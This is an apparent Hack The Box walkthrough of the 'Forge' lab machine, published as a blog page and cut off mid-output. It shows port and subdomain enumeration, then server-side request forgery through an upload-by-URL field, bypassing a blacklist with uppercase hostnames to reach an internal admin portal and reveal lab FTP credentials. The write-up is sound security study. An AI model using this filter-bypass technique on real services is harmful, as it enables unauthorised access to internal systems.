@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	11 Sep 2021IP:	10.10.11.111">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[forge]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/09/13/forge/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	11 Sep 2021IP:	10.10.11.111">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2078.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2079.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2080.jpg">
+<meta property="article:published_time" content="2021-09-12T23:24:39.000Z">
+<meta property="article:modified_time" content="2022-02-06T00:59:37.130Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2078.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/09/13/forge/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/09/13/forge/","path":"2021/09/13/forge/","title":"Hack-The-Box-walkthrough[forge]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[forge] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number"></span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Port-80"><span class="nav-number">2.</span> <span class="nav-text">Port-80</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-escalation"><span class="nav-number">3.</span> <span class="nav-text">Privilege escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">3.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">3.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/09/13/forge/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[forge] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[forge]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-09-13 07:24:39" itemprop="dateCreated datePublished" datetime="2021-09-13T07:24:39+08:00">2021-09-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-02-06 08:59:37" itemprop="dateModified" datetime="2022-02-06T08:59:37+08:00">2022-02-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h2><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	11 Sep 2021<br>IP:	10.10.11.111</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2078.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -v -p- --min-rate=10000 10.10.11.111</span></span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)</span><br><span class="line">|   256 79:<span class="built_in">df</span>:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)</span><br><span class="line">|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.41</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD OPTIONS GET</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Gallery</span><br><span class="line">Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>There are three ports open 21:ftp(filtered),22:ssh,80:http</p>
+<h2 id="Port-80"><a href="#Port-80" class="headerlink" title="Port-80"></a>Port-80</h2><p>When we go to the ip it will redirected to forge.htb</p>
+<p>Let’s quickly add that in our &#x2F;etc&#x2F;hosts file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.111    forge.htb</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s check what’s running on the port 80.</p>
+<p>It’s a simple gallery page.</p>
+<p>And when we go to upload an image page we can see that there is two options to upload file</p>
+<ol>
+<li>upload through local file</li>
+<li>upload through url</li>
+</ol>
+<p>After some hit and try to upload php rev shell through changing shell.php to shell.php.jpg but that’s didn’t work.</p>
+<p>After that i try finding sub-domain with gobuster and i got admin.forge.htb</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -r</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:          http://forge.htb</span><br><span class="line">[+] Method:       GET</span><br><span class="line">[+] Threads:      50</span><br><span class="line">[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt</span><br><span class="line">[+] User Agent:   gobuster/3.1.0</span><br><span class="line">[+] Timeout:      10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/09/12 03:26:55 Starting gobuster <span class="keyword">in</span> VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: admin.forge.htb (Status: 200) [Size: 27]</span><br></pre></td></tr></table></figure>
+
+<p>After that i quickly add that in my host file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.111    forge.htb admin.forge.htb</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s go to admin.forge.htb</p>
+<p>And we see only localhost is allowed.</p>
+<p>After that i think we can access that admin page with upload from url functionality which we see in the forge.htb&#x2F;upload page.</p>
+<p>For that let’s first capture that req in burp.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: forge.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">Origin: http://forge.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://forge.htb/upload</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="built_in">test</span>&amp;remote=1</span><br></pre></td></tr></table></figure>
+
+<p>And we can only use http,https.</p>
+<p>So let’s first try with loopback address.</p>
+<p>And we see it’s a blacklisted address.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: forge.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">Origin: http://forge.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://forge.htb/upload</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=http://127.0.0.1/&amp;remote=1</span><br></pre></td></tr></table></figure>
+
+<p>get response:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL contains a blacklisted address!</span><br></pre></td></tr></table></figure>
+
+<p>After that let’s check if we can access the admin.forge.htb</p>
+<p>And we see it’s also a blacklisted address.</p>
+<p>Let’s capitalize all letters of the sub-domain to check if it’s bypass the filter.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ADMIN.FORGE.HTB&amp;remote=1</span><br></pre></td></tr></table></figure>
+
+<p>And we see we successfully bypass the filter and get the link.</p>
+<p>let’s open that link and see what’s inside that admin page.</p>
+<p>And we can see firefox can’t open that so let’s try with curl.</p>
+<p>And we get the html souce code of the admin page.</p>
+<p>And there is an &#x2F;announcements page let’s take a look on that.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># curl http://forge.htb/uploads/763OjQjUrBpQmd1VpIbP</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;title&gt;Admin Portal&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/static/css/main.css&quot;</span>&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">            &lt;nav&gt;</span><br><span class="line">                &lt;h1 class=<span class="string">&quot;&quot;</span>&gt;&lt;a href=<span class="string">&quot;/&quot;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">                &lt;h1 class=<span class="string">&quot;align-right margin-right&quot;</span>&gt;&lt;a href=<span class="string">&quot;/announcements&quot;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">                &lt;h1 class=<span class="string">&quot;align-right&quot;</span>&gt;&lt;a href=<span class="string">&quot;/upload&quot;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">            &lt;/nav&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s add &#x2F;announcements in the req.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ADMIN.FORGE.HTB/announcements&amp;remote=1</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s check what’s inside that page with curl.</p>
+<p>Boom we got the ftp creads and some notes</p>
+<p>But the problem is we can’t login inside ftp with these creads because the ftp port is filtered.</p>
+<p>But the notes said they support ftp,ftps,http,https for uploading the file through ?u&#x3D; parameter.</p>
+<p>So we can use this functionality to login inside ftp server.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># curl http://forge.htb/uploads/lgoVIX3Ue4VS1AGfSVS0</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;title&gt;Announcements&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/static/css/main.css&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/static/css/announcements.css&quot;</span>&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">            &lt;nav&gt;</span><br><span class="line">                &lt;h1 class=<span class="string">&quot;&quot;</span>&gt;&lt;a href=<span class="string">&quot;/&quot;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">                &lt;h1 class=<span class="string">&quot;align-right margin-right&quot;</span>&gt;&lt;a href=<span class="string">&quot;/announcements&quot;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">                &lt;h1 class=<span class="string">&quot;align-right&quot;</span>&gt;&lt;a href=<span class="string">&quot;/upload&quot;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">            &lt;/nav&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols <span 